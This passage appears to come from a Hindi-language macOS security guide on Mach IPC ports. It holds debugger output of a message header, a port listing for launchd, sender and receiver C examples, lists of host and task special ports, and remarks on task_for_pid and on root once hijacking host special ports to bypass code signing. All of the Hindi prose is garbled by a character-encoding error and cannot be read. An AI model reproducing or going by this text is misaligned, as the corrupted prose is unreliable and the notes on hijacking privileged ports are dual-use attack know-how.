x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
рд╕рдВрджреЗрд╢ рд╣реЗрдбрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╣реБрдП:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
`mach_msg_bits_t` рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрддреНрддрд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рд╣реИред



### рдкреЛрд░реНрдЯреНрд╕ рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
The **name** рд╡рд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдирд╛рдо рд╣реИ рдЬреЛ рдкреЛрд░реНрдЯ рдХреЛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдЪреЗрдХ рдХрд░реЗрдВ рдХрд┐ рдпрд╣ рдкрд╣рд▓реЗ 3 рдмрд╛рдЗрдЯреНрд╕ рдореЗрдВ рдХреИрд╕реЗ **рдмрдврд╝ рд░рд╣рд╛** рд╣реИ)ред **`ipc-object`** рдкреЛрд░реНрдЯ рдХрд╛ **рдЕрд╡рд┐рдХреГрдд** рдЕрджреНрд╡рд┐рддреАрдп **рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛** рд╣реИред\
рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЗрд╡рд▓ **`send`** рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯ рдЗрд╕рдХреЗ **рд╕реНрд╡рд╛рдореА рдХреА рдкрд╣рдЪрд╛рди** рдХрд░ рд░рд╣реЗ рд╣реИрдВ (рдкреЛрд░реНрдЯ рдирд╛рдо + pid)ред\
рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`+`** рдХрд╛ рдЙрдкрдпреЛрдЧ **рдПрдХ рд╣реА рдкреЛрд░реНрдЯ рд╕реЗ рдЬреБрдбрд╝реЗ рдЕрдиреНрдп рдХрд╛рд░реНрдпреЛрдВ** рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

[**procesxp**](https://www.newosxbook.com/tools/procexp.html) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкрдВрдЬреАрдХреГрдд рд╕реЗрд╡рд╛ рдирд╛рдореЛрдВ** рдХреЛ рднреА рджреЗрдЦрдирд╛ рд╕рдВрднрд╡ рд╣реИ (SIP рдХреЛ `com.apple.system-task-port` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдХрд╛рд░рдг рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ):
```
procesp 1 ports
```
рдЖрдк рдЗрд╕ рдЯреВрд▓ рдХреЛ iOS рдореЗрдВ [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдХреЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдкреНрд░реЗрд╖рдХ** рдПрдХ рдкреЛрд░реНрдЯ **рдЖрд╡рдВрдЯрд┐рдд** рдХрд░рддрд╛ рд╣реИ, рдирд╛рдо `org.darlinghq.example` рдХреЗ рд▓рд┐рдП рдПрдХ **рднреЗрдЬрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░** рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рд╕рд░реНрд╡рд░** рдкрд░ рднреЗрдЬрддрд╛ рд╣реИ рдЬрдмрдХрд┐ рдкреНрд░реЗрд╖рдХ рдиреЗ рдЙрд╕ рдирд╛рдо рдХреЗ **рднреЗрдЬрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░** рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ред

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## рд╡рд┐рд╢реЗрд╖ рдкреЛрд░реНрдЯ

рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рдкреЛрд░реНрдЯ рд╣реИрдВ рдЬреЛ **рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдиреЗ рдпрд╛ рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░реНрдп рдХреЗ рдкрд╛рд╕ рдЙрдирдХреЗ рдКрдкрд░ **SEND** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВред рдпрд╣ рдЗрди рдкреЛрд░реНрдЯреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рдмрдирд╛рддрд╛ рд╣реИ, рди рдХреЗрд╡рд▓ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдХрд╛рд░рдг рдмрд▓реНрдХрд┐ рдЗрд╕рд▓рд┐рдП рдХрд┐ рдпрд╣ **рдХрд╛рд░реНрдп рдХреЗ рдмреАрдЪ SEND рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╕рд╛рдЭрд╛ рдХрд░рдирд╛** рд╕рдВрднрд╡ рд╣реИред

### рд╣реЛрд╕реНрдЯ рд╡рд┐рд╢реЗрд╖ рдкреЛрд░реНрдЯ

рдЗрди рдкреЛрд░реНрдЯреЛрдВ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**SEND** рдЕрдзрд┐рдХрд╛рд░ **`host_get_special_port`** рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **RECEIVE** рдЕрдзрд┐рдХрд╛рд░ **`host_set_special_port`** рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗред рд╣рд╛рд▓рд╛рдБрдХрд┐, рджреЛрдиреЛрдВ рдХреЙрд▓ рдХреЗ рд▓рд┐рдП **`host_priv`** рдкреЛрд░реНрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕реЗ рдХреЗрд╡рд▓ рд░реВрдЯ рд╣реА рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрддреАрдд рдореЗрдВ рд░реВрдЯ **`host_set_special_port`** рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдордирдорд╛рдиреЗ рддрд░реАрдХреЗ рд╕реЗ рд╣рд╛рдЗрдЬреИрдХ рдХрд░ рд╕рдХрддрд╛ рдерд╛, рдЬрд┐рд╕рд╕реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рдереА, рдЬреИрд╕реЗ рдХрд┐ `HOST_KEXTD_PORT` рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдХреЗ (SIP рдЕрдм рдЗрд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ)ред

рдЗрдирдХрд╛ рд╡рд┐рднрд╛рдЬрди 2 рд╕рдореВрд╣реЛрдВ рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ: **рдкрд╣рд▓реЗ 7 рдкреЛрд░реНрдЯ рдХрд░реНрдиреЗрд▓ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реИрдВ**, рдЬрд┐рд╕рдореЗрдВ 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` рдФрд░ 7 `HOST_MAX_SPECIAL_KERNEL_PORT` рд╣реИред\
рд╕рдВрдЦреНрдпрд╛ **8** рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯ **рд╕рд┐рд╕реНрдЯрдо рдбреЗрдордиреНрд╕ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реИрдВ** рдФрд░ рдЗрдиреНрд╣реЗрдВ [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

* **рд╣реЛрд╕реНрдЯ рдкреЛрд░реНрдЯ**: рдпрджрд┐ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд╛рд╕ рдЗрд╕ рдкреЛрд░реНрдЯ рдкрд░ **SEND** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИ, рддреЛ рд╡рд╣ **рд╕реВрдЪрдирд╛** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреА рд╣реИ рдЬреИрд╕реЗ:
* `host_processor_info`: рдкреНрд░реЛрд╕реЗрд╕рд░ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `host_info`: рд╣реЛрд╕реНрдЯ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `host_virtual_physical_table_info`: рд╡рд░реНрдЪреБрдЕрд▓/рдлрд┐рдЬрд┐рдХрд▓ рдкреЗрдЬ рдЯреЗрдмрд▓ (MACH\_VMDEBUG рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)
* `host_statistics`: рд╣реЛрд╕реНрдЯ рд╕рд╛рдВрдЦреНрдпрд┐рдХреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `mach_memory_info`: рдХрд░реНрдиреЗрд▓ рдореЗрдореЛрд░реА рд▓реЗрдЖрдЙрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╣реЛрд╕реНрдЯ рдкреНрд░рд┐рд╡ рдкреЛрд░реНрдЯ**: рдЗрд╕ рдкреЛрд░реНрдЯ рдкрд░ **SEND** рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХреНрд░рд┐рдпрд╛рдПрдБ** рдХрд░ рд╕рдХрддреА рд╣реИ рдЬреИрд╕реЗ рдмреВрдЯ рдбреЗрдЯрд╛ рджрд┐рдЦрд╛рдирд╛ рдпрд╛ рдХрд░реНрдиреЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛ред рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред
* рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **`kext_request`** API рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ **`com.apple.private.kext*`** рдЬреЛ рдХреЗрд╡рд▓ Apple рдмрд╛рдЗрдирд░реА рдХреЛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
* рдЕрдиреНрдп рд░реВрдЯреАрди рдЬреЛ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
* `host_get_boot_info`: `machine_boot_info()` рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `host_priv_statistics`: рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рд╕рд╛рдВрдЦреНрдпрд┐рдХреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `vm_allocate_cpm`: рдирд┐рд░рдВрддрд░ рднреМрддрд┐рдХ рдореЗрдореЛрд░реА рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ
* `host_processors`: рд╣реЛрд╕реНрдЯ рдкреНрд░реЛрд╕реЗрд╕рд░ рдХреЛ рднреЗрдЬреЗрдВ
* `mach_vm_wire`: рдореЗрдореЛрд░реА рдХреЛ рдирд┐рд╡рд╛рд╕рд┐рдд рдмрдирд╛рдПрдВ
* рдЪреВрдВрдХрд┐ **рд░реВрдЯ** рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ `host_set_[special/exception]_port[s]` рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ **рд╣реЛрд╕реНрдЯ рд╡рд┐рд╢реЗрд╖ рдпрд╛ рдЕрдкрд╡рд╛рдж рдкреЛрд░реНрдЯ рдХреЛ рд╣рд╛рдЗрдЬреИрдХ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рд╕рднреА рд╣реЛрд╕реНрдЯ рд╡рд┐рд╢реЗрд╖ рдкреЛрд░реНрдЯреЛрдВ рдХреЛ** рдЪрд▓рд╛рдХрд░ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХреЗ:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

рдпреЗ рдкреЛрд░реНрдЯреНрд╕ рдкреНрд░рд╕рд┐рджреНрдз рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЖрд░рдХреНрд╖рд┐рдд рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ `task_[get/set]_special_port` рдХреЙрд▓ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд/рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрдиреНрд╣реЗрдВ `task_special_ports.h` рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[task-self send right]: рдЗрд╕ рдХрд╛рд░реНрдп рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдкреЛрд░реНрдЯред рдЗрд╕ рдХрд╛рд░реНрдп рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ **mach\_task\_self (рдиреАрдЪреЗ рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ рджреЗрдЦреЗрдВ)** рджреНрд╡рд╛рд░рд╛ рд▓реМрдЯрд╛рдпрд╛ рдЧрдпрд╛ рдкреЛрд░реНрдЯ рд╣реИред
* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: рдХрд╛рд░реНрдп рдХрд╛ рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рдкреЛрд░реНрдЯред рдЕрдиреНрдп рд╕рд┐рд╕реНрдЯрдо рд╕реЗрд╡рд╛ рдкреЛрд░реНрдЯ рдХреА рд╡рд╛рдкрд╕реА рдХреЗ рд▓рд┐рдП рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: рд╕рдорд╛рд╣рд┐рдд рд╣реЛрд╕реНрдЯ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдкреЛрд░реНрдЯред рдпрд╣ **mach\_host\_self** рджреНрд╡рд╛рд░рд╛ рд▓реМрдЯрд╛рдпрд╛ рдЧрдпрд╛ рдкреЛрд░реНрдЯ рд╣реИред
* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: рд╡рд╣ рдкреЛрд░реНрдЯ рдЬреЛ рдЗрд╕ рдХрд╛рд░реНрдп рдХреЗ рд▓рд┐рдП рд╡рд╛рдпрд░реНрдб рдХрд░реНрдиреЗрд▓ рдореЗрдореЛрд░реА рдХрд╛ рд╕реНрд░реЛрдд рдирд╛рдорд┐рдд рдХрд░рддрд╛ рд╣реИред
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: рд╡рд╣ рдкреЛрд░реНрдЯ рдЬреЛ рдЗрд╕ рдХрд╛рд░реНрдп рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдореЗрдореЛрд░реА рдкреНрд░рдмрдВрдзрд┐рдд рдореЗрдореЛрд░реА рдХрд╛ рд╕реНрд░реЛрдд рдирд╛рдорд┐рдд рдХрд░рддрд╛ рд╣реИред

### рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ

рд╢реБрд░реБрдЖрдд рдореЗрдВ Mach рдореЗрдВ "рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ" рдирд╣реАрдВ рдереАрдВ, рдмрд▓реНрдХрд┐ "рдХрд╛рд░реНрдп" рдереЗ рдЬрд┐рдиреНрд╣реЗрдВ рдзрд╛рдЧреЛрдВ рдХреЗ рдХрдВрдЯреЗрдирд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдзрд┐рдХ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рдерд╛ред рдЬрдм Mach рдХреЛ BSD рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛, **рддреЛ рдкреНрд░рддреНрдпреЗрдХ рдХрд╛рд░реНрдп рдХреЛ рдПрдХ BSD рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛**ред рдЗрд╕рд▓рд┐рдП рд╣рд░ BSD рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд╛рд╕ рд╡рд╣ рд╡рд┐рд╡рд░рдг рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреА рдЙрд╕реЗ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ рд╣рд░ Mach рдХрд╛рд░реНрдп рдХреЗ рдкрд╛рд╕ рднреА рдЗрд╕рдХреЗ рдЖрдВрддрд░рд┐рдХ рдХрд╛рд░реНрдп рд╣реЛрддреЗ рд╣реИрдВ (рд╕рд┐рд╡рд╛рдп рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди pid 0 рдХреЗ рдЬреЛ `kernel_task` рд╣реИ)ред

рдЗрд╕рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рджреЛ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рдХрд╛рд░реНрдп рд╣реИрдВ:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: рдирд┐рд░реНрджрд┐рд╖реНрдЯ `pid` рджреНрд╡рд╛рд░рд╛ рд╕рдВрдмрдВрдзрд┐рдд рдХрд╛рд░реНрдп рдХреЗ рдХрд╛рд░реНрдп рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ SEND рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ `target_task_port` (рдЬреЛ рдЖрдорддреМрд░ рдкрд░ рд╡рд╣ рдХреЙрд▓рд░ рдХрд╛рд░реНрдп рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдиреЗ `mach_task_self()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдПрдХ рдЕрд▓рдЧ рдХрд╛рд░реНрдп рдкрд░ SEND рдкреЛрд░реНрдЯ рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ) рдХреЛ рджреЗрдВред
* `pid_for_task(task, &pid)`: рдПрдХ рдХрд╛рд░реНрдп рдХреЛ SEND рдЕрдзрд┐рдХрд╛рд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╣ рдкрддрд╛ рдХрд░реЗрдВ рдХрд┐ рдпрд╣ рдХрд╛рд░реНрдп рдХрд┐рд╕ PID рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред

